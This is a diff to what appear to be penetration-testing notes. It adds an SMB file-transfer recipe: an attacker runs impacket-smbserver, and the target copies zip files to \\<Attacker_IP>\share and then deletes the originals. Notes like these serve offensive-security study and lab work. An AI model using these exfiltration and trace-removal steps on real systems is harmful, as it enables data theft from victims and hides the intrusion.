@@ -13,6 +13,11 @@
    
 ### SMB
  - Follow SMB Client Cheet Sheet
+ - Use Impacket-smbserver
+1. mkdir smb
+2. #Attacker: sudo impacket-smbserver -smb2support share $(pwd)
+3. #Target: copy <my_files>.zip \\<Attacker_IP>\share; del <my_files>.zip
+4. Clean up smb shares (delete file and close connection)
    
 ### HTTP
  - 
